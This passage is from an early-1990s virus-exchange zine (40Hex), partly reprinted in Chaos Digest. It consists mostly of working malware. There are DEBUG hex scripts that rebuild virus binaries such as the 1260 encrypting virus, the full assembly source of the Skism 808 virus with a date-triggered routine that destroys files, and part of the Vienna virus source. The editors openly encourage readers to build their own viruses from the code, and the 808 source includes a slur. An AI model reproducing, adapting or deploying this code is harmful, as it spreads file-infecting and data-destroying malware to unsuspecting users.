e 0150  A0 05 55 87 7B 04 7B 25 69 84 56 04 7B 27 69 84
e 0160  F5 44 75 9B F0 71 48 7B C2 80 79 78 88 20 F5 5D
e 0170  81 43 7D 00 7B FB 7B 27 FD 84 80 3C 84 CF B6 A5
e 0180  64 9A 7C 8F 96 F0 77 09 CD FF 7B 3B 7B 85 2C 78
e 0190  DE 21 B8 08 BB AA 7A 82 06 84 91 6F 6E CD 15 B9
e 01A0  84 7B 0E 86 3B 4B FB 78 30 F1 6F B8 78 F0 6B B8
e 01B0  84 F1 72 8A 64 3E A6 85 93 8D 7B 4B 93 81 7B AA
e 01C0  84 AA 7B 86 7D 9A 29 D5 28 D4 C3 84 38 6C 5D 85
e 01D0  09 9C 8D 45 7A F0 70 04 9A 7A C3 85 38 6C 6D 85
e 01E0  09 8C C3 86 46 6C 75 85 08 87 92 86 7A 0F A3 8A
e 01F0  64 3C 7B D3 93 7B 7B 0D 75 80 79 0D 6D 82 79 3E
e 0200  73 86 C2 9F 7B 30 44 6C 97 84 09 CC FA BA 73 86
e 0210  36 DE 0F BD DB 8D 79 BE 7D 8F 79 F0 4C B7 A9 B7
e 0220  B2 3C 79 C6 93 4B 7B F6 50 B9 7B 64 0C A2 2B 25
e 0230  73 86 D8 FF 7B 25 71 86 D8 F9 7B DC 56 87 7B 42
e 0240  7D 8C 79 6D D8 8D 79 26 70 86 90 CD EB 07 45 98
e 0250  79 85 0E 87 92 01 7B 25 77 86 C2 84 79 73 9A D4
e 0260  29 35 7F 57 B1 57 93 87 B9 AF 7D 94 79 D4 DA 98
e 0270  79 27 00 84 DA 9A 79 81 6B 84 D8 F9 7B DC D8 9A
e 0280  79 43 7D 98 79 85 7B 7B 7D 88 79 DD 21 3C 7B C6
e 0290  93 E7 7B F6 3C 04 4D 7C 7A 8C 48 44 F5 5C DB E8
e 02A0  7F 8A 64 8A 7C 26 97 85 48 72 C4 A0 79 D3 C2 84
e 02B0  79 78 88 20 C5 AC 79 6C 21 84 21 3D 7B 86 CF C4
e 02C0  93 B7 7B F6 6C B7 B2 B7 A9 3C 7B C6 93 A3 7B F6
e 02D0  70 3E 73 86 C2 9F 7B 30 3B 6C 61 84 F0 92 7D 86
e 02E0  F0 8A 7F 86 C3 85 2C 6C 77 84 CF BA 93 83 7B DC
e 02F0  20 DD 21 9B 7C 47 E7 AA 84 9A 7B 86 B8 C7 41 D8
e 0300  38 CB 36 C9 3A CA 3F AA 38 CB 36 84 84 5E 56 2E
e 0310  8A 84 E8 01 B9 E8 01 F6 D0 2E 30 04 46 E2 F8 C3

rcx
220
w
q

--------------------------------------------------------------------------
                                                                        HR

+++++

40Hex Volume 1 Issue 2                                                0009

                             The 1260 Virus

     Here's a nice little encrypting virus written in America.

 Aliases:     V2P1
 V Status:    Research
 Discovery:   January, 1990
 Symptoms:    .COM file growth
 Origin:      Minnesota, USA
 Eff Length:  1,260 Bytes
 Type Code:   PNC - Parasitic Encrypting Non-Resident .COM Infector
 Detection Method:  ViruScan V57+, IBM Scan, Pro-Scan 1.4+, F-Prot 1.12+,
              AVTK 3.5+, VirHunt 2.0+, NAV
 Removal Instructions: CleanUp V57+, Pro-Scan 1.4+, F-Prot 1.12+,
              VirHunt 2.0+
 General Comments:

The 1260 virus was first isolated in January, 1990.  This virus does not
install itself resident in memory, but is it extremely virulent at infecting
.COM files.  Infected files will have their length increased by 1,260 bytes,
and the resulting file will be encrypted.  The encryption key changes with
each infection which occurs.

The 1260 virus is derived from the original Vienna Virus, though it is highly
modified.

This virus was developed as a research virus by Mark Washburn, who wished to
show the anti-viral community why identification string scanners do not work
in all cases.  The encryption used in 1260 is one of many possible cases of
the encryption which may occur with Washburn's later research virus, V2P2.

-----------------------------------------------------------------------------

n 1260.com
e 0100  E9 1D 00 6E 66 65 63 74 65 64 20 50 72 6F 67 72
e 0110  61 6D 2E 20 0D 0A 24 BA 02 01 B4 09 CD 21 CD 20
e 0120  90 B8 89 86 4B B9 FD 04 FC 46 BF 47 01 90 2B DA
e 0130  31 0D 33 D1 2B D8 31 05 47 42 4B 40 90 E2 EE 4B
e 0140  4B 42 47 43 42 F8 47 FF 18 71 18 D2 A5 40 19 E2
e 0150  6D B4 08 F8 5C FA F4 A6 EB 08 55 F2 F4 73 82 1A
e 0160  65 C4 C4 4F 82 24 55 FA F4 7B B2 16 55 F4 E4 6F
e 0170  A2 00 1F F9 0C C2 F7 7D 06 73 32 66 F4 45 84 87
e 0180  3D 81 84 7A 77 5E 7F 04 40 C2 39 D7 C8 FA 28 C1
e 0190  B6 E1 0D 64 E6 FC 40 D9 39 D3 38 FA 71 A4 38 0A
e 01A0  6B E1 82 38 C3 71 22 77 36 13 F4 42 EE 37 C5 E0
e 01B0  B2 6C E2 CA E4 45 F4 F6 AA A4 75 30 68 FA A8 BE
e 01C0  05 83 F7 A9 BC FF F5 5B 5B 86 18 15 0F A5 E2 6E
e 01D0  9B 17 6E 39 64 3D 54 F7 7E 0D 1E CD 65 37 46 B9
e 01E0  31 C3 B0 C3 2C DF F7 3B EB A5 D3 79 EB D7 E5 6C
e 01F0  1B C5 6E 91 11 7A 32 56 F5 5F C9 CC 81 F0 B9 87
e 0200  F1 87 2F 6C 71 37 4B F7 F5 A8 EA 7E 83 0F 65 1A
e 0210  1A 97 E6 57 B9 51 7C 89 07 78 06 76 33 6D C5 7E
e 0220  C3 C3 36 63 4E 08 41 B9 7E 25 74 35 54 FB 5C E4
e 0230  E5 2E C4 0C E3 6B 39 43 BA 3E D4 84 F6 10 9A CB
e 0240  8E 87 F2 07 21 E4 CE EF 86 19 73 4C 09 FC E2 18
e 0250  96 01 61 5C 19 FC F8 84 2C 7F 8C 02 A4 7D 04 3F
e 0260  C2 68 68 FC C2 89 08 AE 4A F4 B1 7B 24 7D 20 41
e 0270  E2 29 C3 69 AC 0A 4A F1 B1 75 13 0E 0D 77 54 01
e 0280  40 25 82 4D A3 44 F0 CD 79 22 73 32 53 FC 2F C1
e 0290  91 E0 0B 88 E3 30 79 28 4A F4 A5 3D D3 75 8C 38
e 02A0  4B 92 38 74 FD 45 F1 F0 79 22 73 32 62 FC 2F C1
e 02B0  2E BF CB FA 2E 09 3A F3 F2 38 B0 C7 E3 30 7A CF
e 02C0  0F 49 C1 3E 85 F3 FD 45 FD FB 30 DE 8E F0 04 FA
e 02D0  EC 27 67 36 21 2C A9 37 AC 37 78 57 FE F3 01 2F
e 02E0  A4 4F 59 CF 4C 32 20 FB 31 9F 12 01 31 87 18 00
e 02F0  42 E8 21 7D F6 FE 49 D3 30 DA CE 2E 31 0D FA D9
e 0300  7D 47 4C A6 A9 F2 31 37 BE BD 0D 33 1A 31 12 EF
e 0310  21 CF CC 2A E9 3F 31 BA BB 13 31 78 F3 77 CA CF
e 0320  94 07 CD 4E 0C D4 FC 76 71 FA FD 33 6D 8B 17 EF
e 0330  66 AD 1D 23 D3 44 BB 15 74 7F F9 FF 31 1A 6F F1
e 0340  C1 08 8F E0 D0 F0 30 2E A7 24 7D 3D DB F2 2B A8
e 0350  0A ED EC 06 F8 F3 75 80 12 7B 3F EE FC 3E EA 2F
e 0360  8A 2C 4F CE 00 BE 58 FF FD 7B 3F EE FC 3E 5B B1
e 0370  14 EA 55 EC EC 79 8A 12 30 00 87 38 D9 F2 7F 2A
e 0380  07 CC 62 A5 4B BD 56 75 B2 16 7D 17 4A F1 D7 21
e 0390  98 E3 56 EE EC 1A 4A FE 17 17 30 75 8A 1E 9A 45
e 03A0  32 06 6D D6 F5 F2 7D 38 AB FA 30 C2 41 35 E2 EC
e 03B0  67 3D 1F 4A B2 A9 14 6C FC FF FA FE AC 0D EE C3
e 03C0  E4 90 2E 32 E1 F7 31 9C EB E7 45 FF BF 4A ED EF
e 03D0  57 EB ED 22 CC 81 F2 4B BD 42 FE FF 31 27 92 19
e 03E0  4C 09 5E CF 00 D2 76 A9 07 70 B3 07 7C 12 0D 10
e 03F0  6C 22 F2 EF 55 F2 AA 32 DC 4F C3 32 DC 4B 8C CC
e 0400  06 C5 7B 04 5B 72 3F 5E FD 36 DC E1 76 A5 11 61
e 0410  B3 15 59 F5 20 D2 E2 A6 CE 3B CE 24 CE 21 FE 39
e 0420  46 2E 72 CF CC A4 15 51 FD 38 76 B1 0D 72 1C D3
e 0430  6C 6A 2C A7 7F 22 34 2E 34 2A 34 76 B3 03 8C EE
e 0440  0A 0B 5C 4E 3E 33 07 2F 2E A1 3D A4 AE 33 06 35
e 0450  11 6D 3E 99 17 FB 2E 77 3F 29 1E AC 29 7B 06 94
e 0460  8E 1F CD 8A 22 7B 0E 0F 5A 3B 44 FC FE 18 30 13
e 0470  65 2A CD AA 08 CB B8 1A 8B 0B 3D AF 75 2C DE DA
e 0480  05 FF 8C 73 C9 F2 77 8A 1A 54 CE F8 74 B7 E9 E0
e 0490  EF 60 A9 EB B0 A8 A5 33 AD 73 22 AC A8 7B B8 28
e 04A0  62 F8 CA 46 89 F7 DA 02 76 BF F9 A2 A6 AB 21 70
e 04B0  F0 B8 56 EC EE A0 E1 77 B8 14 D3 7E FE 0A AD 03
e 04C0  0D 80 4B E3 20 96 FD 5C F9 FB F3 A7 5E F5 ED 4C
e 04D0  E3 EB 16 B7 F2 6E 3E 63 E3 AB 45 FF FD A3 D2 44
e 04E0  8B 2B 37 6C C1 F3 76 B9 21 58 F9 FF 76 B5 33 4C
e 04F0  EB EB 66 A9 0F 50 F3 FF 06 A3 E2 62 3E 4C CA 8E
e 0500  35 02 0B 36 70 F7 05 03 BB B0 6D CE F8 C2 E0 DC
e 0510  3C D8 34 C4 35 D8 24 D4 27 6B BD B8 BE B5 8F 37
e 0520  86 5B 2F 28 CE F3 FE FC FE FD FC F6 FC F9 EC E4
e 0530  EC E7 EC E2 EF FD FF EF FF E9 FF EB FF E5 0F 17
e 0540  0F 11 0C 13 0C EE FD E0 FD E5 FD DE FD D3 ED CC
e 0550  ED C9 ED CA 67 BC 14 75 BA 10 77 00 7D 1D 7A CD
e 0560  24 EB CC 7A 8C 4B 10 FA 77 2C 7D 14 21 F1 21 CF
e 0570  70 BA 67 A0 04 79 BA 14 77 04 7D 11 4A F1 64 8D
e 0580  8C D2 11 4D BD F7 CD F3 BC BD 1E 06 3F 19 F9 A7
e 0590  05 F7 EC C4 C2 B1 B3 B3 FC AA BD AA B4 CF 98 87
e 05A0  82 93 E2 8D 83 BF FC B3 FC FA FC FE FC F2 EC EE
e 05B0  EC EA EC EE EC F2 FC FE FC FA FC FE FC F2 0C 0F
e 05C0  0D 0B 0D 0F 0D F3 FD FF FD FB FD FF FD F3 ED EF
e 05D0  ED EB ED EF ED F3 FD FF FD FB FD FF FD F3 CF F0
e 05E0  F2 F4 F2 F0 F2 CC C2 BC B2 B6 FE FC FD F3 ED EF
e 05F0  ED EB ED CF CA 97 A6 ED DD FB FD FF A9 BA C3 D6
e 0600  A3 C8 C2 C2 8D BE FD B2 FD FB FD FF 1A 1A 1A 1A

rcx
50C
w
q

--------------------------------------------------------------------------
                                                                        HR
+++++

40Hex Volume 1 Issue 2                                                0010

                             The 808 Virus

     Here another virus from Skism.  It's a quick overwriting virus but
     you can use the source code to write your own viruses.

--------------------------------------------------------------------------

;The Skism 808 Virus.  Created 1991 by Smart Kids Into Sick Methods.

filename   EQU      30               ;used to find file name
fileattr   EQU      21               ;used to find file attributes
filedate   EQU      24               ;used to find file date
filetime   EQU      22               ;used to find file time

code_start EQU      0100h            ;start of all .COM files
virus_size EQU      808              ;TR 808

code     segment  'code'
assume   cs:code,ds:code,es:code
         org      code_start

main proc   near

jmp    virus_start

encrypt_val    db     00h

virus_start:

     call     encrypt                ;encrypt/decrypt file
     jmp      virus                  ;go to start of code

encrypt:

     push     cx
     mov      bx,offset virus_code   ;start encryption at data

xor_loop:

     mov      ch,[bx]                ;read current byte
     xor      ch,encrypt_val         ;get encryption key
     mov      [bx],ch                ;switch bytes
     inc      bx                     ;move bx up a byte
     cmp      bx,offset virus_code+virus_size
                                     ;are we done with the encryption
     jle      xor_loop               ;no?  keep going
     pop      cx
     ret

infectfile:

     mov     dx,code_start           ;where virus starts in memory
     mov     bx,handle               ;load bx with handle
     push    bx                      ;save handle on stack
     call    encrypt                 ;encrypt file
     pop     bx                      ;get back bx
     mov     cx,virus_size           ;number of bytes to write
     mov     ah,40h                  ;write to file
     int     21h
     push    bx
     call    encrypt                 ;fix up the mess
     pop     bx
     ret

virus_code:

wildcards    db     "*",0            ;search for directory argument
filespec     db     "*.EXE",0        ;search for EXE file argument
filespec2    db     "*.*",0
rootdir      db     "\",0            ;argument for root directory
dirdata      db     43 dup (?)       ;holds directory DTA
filedata     db     43 dup (?)       ;holds files DTA
diskdtaseg   dw     ?                ;holds disk dta segment
diskdtaofs   dw     ?                ;holds disk dta offset
tempofs      dw     ?                ;holds offset
tempseg      dw     ?                ;holds segment
drivecode    db     ?                ;holds drive code
currentdir   db     64 dup (?)       ;save current directory into this
handle       dw     ?                ;holds file handle
orig_time    dw     ?                ;holds file time
orig_date    dw     ?                ;holds file date
orig_attr    dw     ?                ;holds file attr
idbuffer     dw     2 dup  (?)       ;holds virus id

virus:

      mov    ax,3000h                ;get dos version
      int    21h
      cmp    al,02h                  ;is it at least 2.00?
      jb     bus1                    ;won't infect less than 2.00
      mov    ah,2ch                  ;get time
      int    21h
      mov    encrypt_val,dl          ;save m_seconds to encrypt val so
                                     ;theres 100 mutations possible
setdta:

     mov     dx,offset dirdata       ;offset of where to hold new dta
     mov     ah,1ah                  ;set dta address
     int     21h

newdir:

     mov     ah,19h                  ;get drive code
     int     21h
     mov     dl,al                   ;save drivecode
     inc     dl                      ;add one to dl, because functions differ
     mov     ah,47h                  ;get current directory
     mov     si, offset currentdir   ;buffer to save directory in
     int     21h

     mov     dx,offset rootdir       ;move dx to change to root directory
     mov     ah,3bh                  ;change directory to root
     int     21h

scandirs:

     mov     cx,13h                  ;include hidden/ro directorys
     mov     dx, offset wildcards    ;look for '*'
     mov     ah,4eh                  ;find first file
     int     21h
     cmp     ax,12h                  ;no first file?
     jne     dirloop                 ;no dirs found? bail out

bus1:

      jmp    bus

dirloop:

     mov     ah,4fh                  ;find next file
     int     21h
     cmp     ax,12h
     je      bus                     ;no more dirs found, roll out

chdir:

     mov     dx,offset dirdata+filename;point dx to fcb - filename
     mov     ah,3bh                  ;change directory
     int     21h                     ;

     mov     ah,2fh                  ;get current dta address
     int     21h
     mov     [diskdtaseg],es         ;save old segment
     mov     [diskdtaofs],bx         ;save old offset
     mov     dx,offset filedata      ;offset of where to hold new dta
     mov     ah,1ah                  ;set dta address
     int     21h

scandir:

     mov     cx,07h                  ;find any attribute
     mov     dx,offset filespec      ;point dx to "*.COM",0
     mov     ah,4eh                  ;find first file function
     int     21h
     cmp     ax,12h                  ;was file found?
     jne     transform

nextexe:

     mov     ah,4fh                  ;find next file
     int     21h
     cmp     ax,12h                  ;none found
     jne     transform               ;found see what we can do

     mov     dx,offset rootdir       ;move dx to change to root directory
     mov     ah,3bh                  ;change directory to root
     int     21h
     mov     ah,1ah                  ;set dta address
     mov     ds,[diskdtaseg]         ;restore old segment
     mov     dx,[diskdtaofs]         ;restore old offset
     int     21h
     jmp     dirloop

bus:

     jmp     rollout

transform:

     mov     ah,2fh                  ;temporally store dta
     int     21h
     mov     [tempseg],es            ;save old segment
     mov     [tempofs],bx            ;save old offset
     mov     dx, offset filedata + filename

     mov     bx,offset filedata      ;save file...
     mov     ax,[bx]+filedate        ;date
     mov     orig_date,ax            ;
     mov     ax,[bx]+filetime        ;time
     mov     orig_time,ax            ;    and
     mov     ax,[bx]+fileattr
     mov     ax,4300h
     int     21h
     mov     orig_attr,cx
     mov     ax,4301h                ;change attributes
     xor     cx,cx                   ;clear attributes
     int     21h
     mov     ax,3d00h                ;open file - read
     int     21h
     jc      fixup                   ;error - find another file
     mov     handle,ax               ;save handle
     mov     ah,3fh                  ;read from file
     mov     bx,handle               ;move handle to bx
     mov     cx,02h                  ;read 2 bytes
     mov     dx,offset idbuffer      ;save to buffer
     int     21h

     mov     ah,3eh                  ;close file for now
     mov     bx,handle               ;load bx with handle
     int     21h

     mov     bx, idbuffer            ;fill bx with id string
     cmp     bx,02ebh                ;infected?
     jne     doit                    ;same - find another file

fixup:
     mov     ah,1ah                  ;set dta address
     mov     ds,[tempseg]            ;restore old segment
     mov     dx,[tempofs]            ;restore old offset
     int     21h
     jmp     nextexe

doit:

     mov     dx, offset filedata + filename
     mov     ax,3d02h                ;open file read/write access
     int     21h
     mov     handle,ax               ;save handle

     call    infectfile

     ;mov     ax,3eh                 ;close file
     ;int     21h

rollout:

     mov     ax,5701h                ;restore original
     mov     bx,handle
     mov     cx,orig_time            ;time and
     mov     dx,orig_date            ;date
     int     21h

     mov     ax,4301h                ;restore original attributes
     mov     cx,orig_attr
     mov     dx,offset filedata + filename
     int     21h
     ;mov     bx,handle
     ;mov     ax,3eh                 ;close file
     ;int     21h
     mov     ah,3bh                  ;try to fix this
     mov     dx,offset rootdir       ;for speed
     int     21h
     mov     ah,3bh                  ;change directory
     mov     dx,offset currentdir    ;back to original
     int     21h
     mov     ah,2ah                  ;check system date
     int     21h
     cmp     cx,1991                 ;is it at least 1991?
     jb      audi                    ;no? don't do it now
     cmp     dl,25                   ;is it the 25th?
     jb      audi                    ;not yet? quit
     cmp     al,5                    ;is Friday?
     jne     audi                    ;no? quit
     mov     dx,offset dirdata       ;offset of where to hold new dta
     mov     ah,1ah                  ;set dta address
     int     21h
     mov     ah,4eh                  ;find first file
     mov     cx,7h
     mov     dx,offset filespec2     ;offset *.*

Loops:

     int     21h
     jc      audi                    ;error? then quit
     mov     ax,4301h                ;find all normal files
     xor     cx,cx
     int     21h
     mov     dx,offset dirdata + filename
     mov     ah,3ch                  ;fuck up all files in current dir
     int     21h
     jc      audi                    ;error? quit
     mov     ah,4fh                  ;find next file
     jmp     loops

audi:

     mov     ax,4c00h                ;end program
     int     21h

;The below is just text to pad out the virus size to 808 bytes.  Don't
;just change the text and claim that this is your creation.

words_   db   "Skism Rythem Stack Virus-808. Smart Kids Into Sick Methods",0
words2   db   "  Dont alter this code into your own strain, faggit.      ",0
words3   db   "  HR/SSS NYCity, this is the fifth of many, many more....",0
words4   db   "  You sissys.....",0

main     endp
code     ends
         end      main

+++++

40Hex Volume 1 Issue 2                                                 0011

                      Vienna and Violator Viruses

    The Vienna virus, since it's source code was released, has become
    one of the most common viruses ever.  Not only that but there are
    over 20 known strains of this virus.  We at 40Hex want to add on to
    the list by giving out the source for the orginal Vienna virus as
    well as the Violator-B source by Rabid.

---------------------------------------------------------------------------

MOV_CX  MACRO   X
        DB      0B9H
        DW      X
ENDM

CODE    SEGMENT
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE
        ORG     $+0100H

;***************************************************************************
;Start out with a JMP around the remains of the original .COM file, into the
;virus. The actual .COM file was just an INT 20, follow. by a bunch of NOPS.
;The rest of the file (first 3 bytes) are stored in the virus data area.
;***************************************************************************

VCODE:  JMP     virus

;This was the rest  of the original .COM file. Tiny and simple, this time

        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP

;************************************************************
;              The actual virus starts here
;************************************************************

v_start equ     $

virus:  PUSH    CX
        MOV     DX,OFFSET vir_dat     ;This is where the virus data starts.
                                      ; The 2nd and 3rd bytes get modified.
        CLD                           ;Pointers will be auto INcremented
        MOV     SI,DX                 ;Access data as offset from SI
        ADD     SI,first_3            ;Point to original 1st 3 bytes of .COM
        MOV     DI,OFFSET 100H        ;cause all .COM files start at 100H
        MOV     CX,3
        REPZ    MOVSB                 ;Restore original first 3 bytes of .COM
        MOV     SI,DX                 ;Keep SI pointing to the data area

;*************************************************************
;                   Check the DOS version
;*************************************************************

        MOV     AH,30H
        INT     21H

        CMP     AL,0                  ;0 means it's version 1.X

        JNZ     dos_ok                ;For version 2.0 or greater
        JMP     quit                  ;Don't try to infect version 1.X

;*************************************************************
;  Here if the DOS version is high enough for this to work
;*************************************************************

dos_ok: PUSH    ES

;*************************************************************
;               Get DTA address into ES:BX
;*************************************************************

        MOV     AH,2FH
        INT     21H

;*************************************************************
;                    Save the DTA address
;*************************************************************

        MOV     [SI+old_dta],BX
        MOV     [SI+old_dts],ES       ;Save the DTA address

        POP     ES

;*************************************************************
;        Set DTA to point inside the virus data area
;*************************************************************

        MOV     DX,dta                ;Offset of new DTA in virus data area
;       NOP                           ;MASM will add this NOP here
        ADD     DX,SI                 ;Compute DTA address
        MOV     AH,1AH
        INT     21H                   ;Set new DTA to inside our own code

        PUSH    ES
        PUSH    SI
        MOV     ES,DS:2CH
        MOV     DI,0                  ;ES:DI points to environment

;************************************************************
;        Find the "PATH=" string in the environment
;************************************************************

find_path:
        POP     SI
        PUSH    SI                      ;Get SI back
        ADD     SI,env_str              ;Point to "PATH=" string in data area
        LODSB
        MOV     CX,OFFSET 8000H         ;Environment can be 32768 bytes long
        REPNZ   SCASB                   ;Search for first character
        MOV     CX,4

------------------------------

End of Chaos Digest #1.30
************************************

Chaos Digest            Mercredi 19 Mai 1993         Volume 1 : Numero 30
                           ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.30 (19 Mai 1993)
File 1--40H VMag Issue 1 Volume 2 #011(2) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 2 #011(2) (reprint)


[suite du listing des virus Vienna et Violator]

;************************************************************
;       Loop to check for the next four characters
;************************************************************

check_next_4:
        LODSB
        SCASB
        JNZ     find_path             ;If not all there, abort & start over
        LOOP    check_next_4          ;Loop to check the next character

        POP     SI
        POP     ES
        MOV     [SI+path_ad],DI       ;Save the address of the PATH
        MOV     DI,SI
        ADD     DI,wrk_spc            ;File name workspace
        MOV     BX,SI                 ;Save a copy of SI
        ADD     SI,wrk_spc            ;Point SI to workspace
        MOV     DI,SI                 ;Point DI to workspace
        JMP     SHORT   slash_ok

;**********************************************************
;     Look in the PATH for more subdirectories, if any
;**********************************************************

set_subdir:
        CMP     WORD PTR [SI+path_ad],0 ;Is PATH string ended?
        JNZ     found_subdir          ;If not, there are more subdirectories
        JMP     all_done              ;Else, we're all done

;**********************************************************
;    Here if there are more subdirectories in the path
;**********************************************************

found_subdir:
        PUSH    DS
        PUSH    SI
        MOV     DS,ES:2CH              ;DS points to environment segment
        MOV     DI,SI
        MOV     SI,ES:[DI+path_ad]     ;SI = PATH address
        ADD     DI,wrk_spc             ;DI points to file name workspace

;***********************************************************
;      Move subdirectory name into file name workspace
;***********************************************************

move_subdir:
        LODSB                         ;Get character
        CMP     AL,';'                ;Is it a ';' delimiter?
        JZ      moved_one             ;Yes, found another subdirectory
        CMP     AL,0                  ;End of PATH string?
        JZ      moved_last_one        ;Yes
        STOSB                         ;Save PATH marker into [DI]
        JMP     SHORT   move_subdir

;******************************************************************
; Mark the fact that we're looking through the final subdirectory
;******************************************************************

moved_last_one:
        MOV     SI,0

;******************************************************************
;              Here after we've moved a subdirectory
;******************************************************************

moved_one:
        POP     BX                    ;Pointer to virus data area
        POP     DS                    ;Restore DS
        MOV     [BX+path_ad],SI       ;Address of next subdirectory
        NOP

;******************************************************************
;             Make sure subdirectory ends in a "\"
;******************************************************************

        CMP     CH,'\'                ;Ends with "\"?
        JZ      slash_ok              ;If yes
        MOV     AL,'\'                ;Add one, if not
        STOSB

;******************************************************************
;     Here after we know there's a backslash at end of subdir
;******************************************************************

slash_ok:
        MOV     [BX+nam_ptr],DI       ;Set filename pointer to name workspace
        MOV     SI,BX                 ;Restore SI
        ADD     SI,f_spec             ;Point to "*.COM"
        MOV     CX,6
        REPZ    MOVSB                 ;Move "*.COM",0 to workspace

        MOV     SI,BX

;*******************************************************************
;                 Find first string matching *.COM
;*******************************************************************

        MOV     AH,4EH
        MOV     DX,wrk_spc
;       NOP                           ;MASM will add this NOP here
        ADD     DX,SI                 ;DX points to "*.COM" in workspace
        MOV     CX,3                  ;Attributes of Read Only or Hidden OK
        INT     21H

        JMP     SHORT   find_first

;*******************************************************************
;              Find next ASCIIZ string matching *.COM
;*******************************************************************

find_next:
        MOV     AH,4FH
        INT     21H

find_first:
        JNB     found_file              ;Jump if we found it
        JMP     SHORT   set_subdir      ;Otherwise, get another subdirectory

;*******************************************************************
;                      Here when we find a file
;*******************************************************************

found_file:
        MOV     AX,[SI+dta_tim]       ;Get time from DTA
        AND     AL,1FH                ;Mask to remove all but seconds
        CMP     AL,1FH                ;62 seconds -> already infected
        JZ      find_next             ;If so, go find another file

        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H ;Is the file too long?
        JA      find_next             ;If too long, find another one

        CMP     WORD PTR [SI+dta_len],0AH ;Is it too short?
        JB      find_next             ;Then go find another one

        MOV     DI,[SI+nam_ptr]       ;DI points to file name
        PUSH    SI                    ;Save SI
        ADD     SI,dta_nam            ;Point SI to file name

;********************************************************************
;                Move the name to the end of the path
;********************************************************************

more_chars:
        LODSB
        STOSB
        CMP     AL,0
        JNZ     more_chars            ;Move characters until we find a 00

;********************************************************************
;                        Get File Attributes
;********************************************************************

        POP     SI
        MOV     AX,OFFSET 4300H
        MOV     DX,wrk_spc            ;Point to \path\name in workspace
;       NOP                           ;MASM will add this NOP here
        ADD     DX,SI
        INT     21H

        MOV     [SI+old_att],CX       ;Save the old attributes

;********************************************************************
;         Rewrite the attributes to allow writing to the file
;********************************************************************

        MOV     AX,OFFSET 4301H       ;Set attributes
        AND     CX,OFFSET 0FFFEH      ;Set all except "read only" (weird)
        MOV     DX,wrk_spc            ;Offset of \path\name in workspace
;       NOP                           ;MASM will add this NOP here
        ADD     DX,SI                 ;Point to \path\name
        INT     21H

;********************************************************************
;                Open Read/Write channel to the file
;********************************************************************

        MOV     AX,OFFSET 3D02H       ;Read/Write
        MOV     DX,wrk_spc            ;Offset to \path\name in workspace
;       NOP                           ;MASM will add this NOP here
        ADD     DX,SI                 ;Point to \path\name
        INT     21H

        JNB     opened_ok             ;If file was opened OK
        JMP     fix_attr              ;If it failed, restore the attributes

;*******************************************************************
;                        Get the file date & time
;*******************************************************************

opened_ok:
        MOV     BX,AX
        MOV     AX,OFFSET 5700H
        INT     21H

        MOV     [SI+old_tim],CX       ;Save file time
        MOV     [SI+ol_date],DX       ;Save the date

;*******************************************************************
;                        Get current system time
;*******************************************************************

        MOV     AH,2CH
        INT     21H

        AND     DH,7                  ;Last 3 bits 0? (once in eight)
        JNZ     seven_in_eight

;*******************************************************************
; The special "one in eight" infection. If the above line were in
;  its original form, this code would be run 1/8 of the time, and
;  rather than appending a copy of this virus to the .COM file, the
;  file would get 5 bytes of code that reboot the system when the
;  .COM file is run.
;*******************************************************************

        MOV     AH,40H                ;Write to file
        MOV     CX,5                  ;Five bytes
        MOV     DX,SI
        ADD     DX,reboot             ;Offset of reboot code in data area
        INT     21H

        JMP     SHORT   fix_time_stamp

        NOP

;******************************************************************
;      Here's where we infect a .COM file with this virus
;******************************************************************

seven_in_eight:
        MOV     AH,3FH
        MOV     CX,3
        MOV     DX,first_3
;       NOP                     ;MASM will add this NOP here
        ADD     DX,SI
        INT     21H             ;Save first 3 bytes into the data area

        JB      fix_time_stamp  ;Quit, if read failed

        CMP     AX,3            ;Were we able to read all 3 bytes?
        JNZ     fix_time_stamp  ;Quit, if not

;******************************************************************
;              Move file pointer to end of file
;******************************************************************

        MOV     AX,OFFSET 4202H
        MOV     CX,0
        MOV     DX,0
        INT     21H

        JB      fix_time_stamp  ;Quit, if it didn't work

        MOV     CX,AX           ;DX:AX (long int) = file size
        SUB     AX,3            ;Subtract 3 (OK, since DX must be 0, here)
        MOV     [SI+jmp_dsp],AX ;Save the displacement in a JMP instruction

        ADD     CX,OFFSET c_len_y
        MOV     DI,SI           ;Point DI to virus data area
        SUB     DI,OFFSET c_len_x
                                ;Point DI to reference vir_dat, at start of
pgm
